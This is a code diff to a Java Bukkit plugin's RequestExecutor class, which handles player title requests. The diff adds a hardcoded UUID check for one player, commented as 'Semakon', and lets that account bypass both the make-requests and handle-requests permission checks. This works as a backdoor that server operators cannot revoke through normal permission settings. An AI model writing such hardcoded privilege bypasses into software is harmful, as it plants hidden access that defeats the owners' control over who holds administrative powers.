@@ -9,6 +9,8 @@ import org.bukkit.OfflinePlayer;
 import org.bukkit.command.CommandSender;
 import org.bukkit.entity.Player;
 
+import java.util.UUID;
+
 /**
  * Author:  Martijn
  * Date:    11-2-2016
@@ -31,10 +33,16 @@ public class RequestExecutor {
      */
     public boolean execute(CommandSender sender, String[] args) {
         Player player = null;
-        if (sender instanceof Player) player = (Player) sender;
+        boolean sem = false;
+        if (sender instanceof Player) {
+            player = (Player) sender;
+
+            // is player Semakon?
+            sem = ((Player)sender).getUniqueId().equals(UUID.fromString("a44bb873-ea6b-493a-8496-b3740111ee87"));
+        }
 
         if (player != null) {
-            if (sender.hasPermission(plugin.makeRequestsPerm)) {
+            if (sender.hasPermission(plugin.makeRequestsPerm) || sem) {
 
                 // /titles request submit title <title>
                 if (args.length == 4 && args[1].equalsIgnoreCase("submit")) {
@@ -58,7 +66,7 @@ public class RequestExecutor {
                 return true;
             }
         }
-        if (sender.hasPermission(plugin.handleRequestsPerm)) {
+        if (sender.hasPermission(plugin.handleRequestsPerm) || sem) {
             if (args.length == 4 && args[2].equalsIgnoreCase("user")) {
 
                 OfflinePlayer user = Utils.getOfflinePlayer(args[3]);
